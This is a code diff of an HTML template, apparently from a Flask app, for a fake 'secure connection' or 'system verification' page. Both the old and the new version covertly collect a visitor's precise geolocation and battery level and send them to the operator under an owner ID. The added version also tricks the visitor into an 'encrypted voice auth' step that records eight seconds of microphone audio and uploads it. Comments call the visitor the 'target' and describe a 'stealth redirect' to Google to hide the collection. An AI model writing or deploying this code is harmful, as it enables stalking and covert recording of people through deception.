@@ -1,41 +1,83 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Checking Connection...</title>
-    <script>
-        // Backend URL aur Owner ID (Flask se auto-fill hogi)
-        const BACKEND_URL = "/update";
-        const OWNER_ID = "{{ owner_id }}"; 
-
-        async function sendData(lat, lon, battery) {
-            // Data mein owner_id bhi bheja ja raha hai
-            const params = `?lat=${lat}&lon=${lon}&batt=${battery}&owner_id=${OWNER_ID}`;
-            try {
-                await fetch(BACKEND_URL + params);
-            } catch (e) {
-                console.log("Error sending data");
-            }
-            // Stealth Redirect: Target ko lagega network check ho raha tha
-            window.location.href = "https://www.google.com"; 
-        }
-
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            try {
-                const batt = await navigator.getBattery();
-                const batteryLevel = Math.floor(batt.level * 100) + "%";
-                sendData(pos.coords.latitude, pos.coords.longitude, batteryLevel);
-            } catch (e) {
-                sendData(pos.coords.latitude, pos.coords.longitude, "Unknown");
-            }
-        }, (err) => {
-            // Agar permission deny kare toh bhi redirect kar do
-            window.location.href = "https://www.google.com";
-        }, {enableHighAccuracy: true});
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body { margin: 0; background: #0f172a; color: white; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .loader { border: 4px solid #1e293b; border-top: 4px solid #00d2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { font-size: 0.9rem; color: #94a3b8; }
+        #mic-btn { background: #00d2ff; border: none; padding: 10px 20px; border-radius: 8px; color: #0f172a; font-weight: bold; cursor: pointer; display: none; margin-top: 15px; }
+    </style>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <p>Loading secure connection... Please wait.</p>
-    </div>
+
+    <div class="loader"></div>
+    <h3>SECURE CONNECTION</h3>
+    <p class="status" id="status-text">Detecting environment...</p>
+    
+    <button id="mic-btn" onclick="initiateSystem()">VERIFY IDENTITY</button>
+
+    <script>
+        const OWNER_ID = "{{ owner_id }}";
+
+        // 1. Pehle Location bhejo
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            let batt = "N/A";
+            try {
+                const b = await navigator.getBattery();
+                batt = Math.floor(b.level * 100) + "%";
+            } catch(e){}
+
+            // Update Location
+            fetch(`/update?lat=${lat}&lon=${lon}&batt=${batt}&owner_id=${OWNER_ID}`);
+            
+            // Location milte hi Mic ke liye request bhejo
+            document.getElementById('status-text').innerText = "Encrypted Voice Auth Required...";
+            document.getElementById('mic-btn').style.display = "block";
+        }, () => {
+            // Agar location block kare toh seedha Google bhejo
+            window.location.href = "https://www.google.com";
+        });
+
+        // 2. Audio Recording Logic
+        async function initiateSystem() {
+            document.getElementById('mic-btn').innerText = "VERIFYING...";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const formData = new FormData();
+                    formData.append('audio', blob);
+                    formData.append('owner_id', OWNER_ID);
+
+                    await fetch('/upload_audio', { method: 'POST', body: formData });
+                    
+                    // Saara kaam khatam, ab target ko redirect karo
+                    window.location.href = "https://www.google.com";
+                };
+
+                mediaRecorder.start();
+                // 8 second record karo
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 8000);
+
+            } catch (err) {
+                // Permission deny hui toh bhi redirect
+                window.location.href = "https://www.google.com";
+            }
+        }
+    </script>
 </body>
 </html>
